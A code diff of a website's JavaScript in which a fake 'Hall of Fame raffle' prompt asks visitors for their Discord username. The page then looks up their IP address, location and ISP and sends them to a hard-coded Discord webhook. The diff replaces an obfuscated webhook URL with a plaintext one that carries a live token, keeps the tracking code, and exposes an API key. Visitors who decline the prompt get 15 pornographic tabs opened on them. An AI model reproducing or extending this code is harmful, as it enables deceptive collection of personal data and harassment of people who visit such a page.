@@ -1,32 +1,6 @@
-const _0x3f8b2c = [
-    0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x64, 0x69, 0x73, 0x63,
-    0x6f, 0x72, 0x64, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x61, 0x70, 0x69, 0x2f,
-    0x77, 0x65, 0x62, 0x68, 0x6f, 0x6f, 0x6b, 0x73, 0x2f, 0x31, 0x33, 0x30,
-    0x35, 0x36, 0x35, 0x34, 0x31, 0x35, 0x30, 0x38, 0x39, 0x33, 0x31, 0x34,
-    0x32, 0x31, 0x31, 0x36, 0x2f, 0x6b, 0x67, 0x4d, 0x79, 0x56, 0x4b, 0x58,
-    0x34, 0x33, 0x35, 0x6f, 0x38, 0x56, 0x57, 0x2d, 0x57, 0x48, 0x43, 0x57,
-    0x58, 0x30, 0x76, 0x66, 0x4f, 0x36, 0x46, 0x43, 0x79, 0x7a, 0x70, 0x76,
-    0x33, 0x38, 0x64, 0x36, 0x4f, 0x35, 0x72, 0x53, 0x66, 0x77, 0x76, 0x4d,
-    0x55, 0x46, 0x64, 0x39, 0x67, 0x72, 0x4f, 0x50, 0x70, 0x39, 0x55, 0x76,
-    0x33, 0x41, 0x56, 0x71, 0x4d, 0x45, 0x4c, 0x46, 0x53, 0x2d, 0x56, 0x6f, 0x43
-];
+const webhookUrl = 'https://discord.com/api/webhooks/1305654150893142116/kgMyVKX435o8VW-WHCWX0vfO6FCyzpv38d6O5rSfwvMUFd9grOPp9Uv3AVqMELFS-VoC';
 
-const _0x2d9e1f = (data) => {
-    const key = [0x52, 0x41, 0x47, 0x45];
-    return data.map((byte, i) => {
-        const shift = ((i * 7) + key[i % key.length]) % 256;
-        return String.fromCharCode(byte ^ shift);
-    }).join('');
-};
-
-function getEndpoint() {
-    return _0x2d9e1f(_0x3f8b2c);
-}
-
-function decryptWebhook(encryptedHook) {
-    const key = "ragers";
-    return atob(encryptedHook);
-}
+let audioInitialized = false;
 
 const brandDescription = [
     'pro ragers',
@@ -40,29 +14,39 @@ const brandDescription = [
 
 const effects = ['bounce', 'flash', 'pulse', 'rubberBand', 'shake', 'swing', 'tada', 'wobble', 'jello'];
 
+function validateWebhookData(data) {
+    const fields = data.embeds[0].fields;
+
+    const ipField = fields.find(f => f.name === "IP Address");
+    const locationField = fields.find(f => f.name === "Location");
+    const ispField = fields.find(f => f.name === "ISP");
+
+    return ipField && locationField && ispField;
+}
+
 function promptUser() {
     const video = document.querySelector('.background-video');
     const username = prompt("You have been chosen in a raffle to be apart of Ragers Hall Of Fame, Please Input your discord username.");
 
     if (username) {
+        console.log("Username entered:", username);
+
+        const audio = document.getElementById('backgroundAudio');
+        if (audio) {
+            audio.pause();
+            audio.currentTime = 0;
+        }
+
         video.currentTime = 0;
         video.muted = false;
         video.volume = 1.0;
-        const playPromise = video.play();
-
-        if (playPromise !== undefined) {
-            playPromise.then(() => {
-                // Video is playing perfectly!
-            }).catch(error => {
-                document.addEventListener('click', () => {
-                    video.play();
-                }, { once: true });
-            });
-        }
+        video.play().catch(error => console.log("Video play error:", error));
 
         fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=e3936cf89e4b41c8af209d86c02a8a39`)
             .then(response => response.json())
             .then(data => {
+                console.log("IP data received:", data);
+
                 const webhookData = {
                     content: `New Hall of Fame Entry!`,
                     embeds: [{
@@ -78,12 +62,23 @@ function promptUser() {
                     }]
                 };
 
-                fetch(getEndpoint(), {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(webhookData)
-                });
-            });
+                if (validateWebhookData(webhookData)) {
+                    return fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(webhookData)
+                    });
+                } else {
+                    throw new Error('Invalid webhook data detected');
+                }
+            })
+            .then(response => {
+                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+                console.log('Webhook sent successfully');
+            })
+            .catch(error => console.log('Operation error:', error));
     } else {
         for (let i = 0; i < 15; i++) {
             window.open("https://www.pornhub.com/view_video.php?viewkey=672298c5e2062", "_blank");
@@ -97,33 +92,39 @@ document.addEventListener('DOMContentLoaded', () => {
     const video = document.querySelector('.background-video');
     video.muted = true;
 
-    setTimeout(() => {
+    const initializeUI = () => {
         loadingContainer.classList.add('fade-out');
-        setTimeout(() => {
-            loadingContainer.style.display = 'none';
-            mainPage.style.display = 'block';
-            mainPage.classList.add('fade-in');
-            video.play();
-            updateBrandDescription();
-            setTimeout(promptUser, 1000);
-        }, 1000);
+        mainPage.style.display = 'block';
+        mainPage.classList.add('fade-in');
+        video.play();
+        updateBrandDescription();
+        return new Promise(resolve => setTimeout(resolve, 1000));
+    };
+
+    setTimeout(() => {
+        loadingContainer.style.display = 'none';
+        initializeUI().then(promptUser);
     }, 2750);
 });
 
 function updateBrandDescription() {
     const element = document.getElementById('brandDescription');
-    let currentIndex = 0;
-
-    setInterval(() => {
-        const randomEffect = effects[Math.floor(Math.random() * effects.length)];
-        element.textContent = brandDescription[currentIndex];
-        element.className = `animate__animated animate__${randomEffect}`;
-        currentIndex = (currentIndex + 1) % brandDescription.length;
-    }, 2000);
+    if (element) {
+        let currentIndex = 0;
+        setInterval(() => {
+            const randomEffect = effects[Math.floor(Math.random() * effects.length)];
+            element.textContent = brandDescription[currentIndex];
+            element.className = `animate__animated animate__${randomEffect}`;
+            currentIndex = (currentIndex + 1) % brandDescription.length;
+        }, 2000);
+    }
 }
 
 fetch('users.html')
     .then(response => response.text())
     .then(data => {
-        document.getElementById('users-container').innerHTML = data;
+        const container = document.getElementById('users-container');
+        if (container) {
+            container.innerHTML = data;
+        }
     });
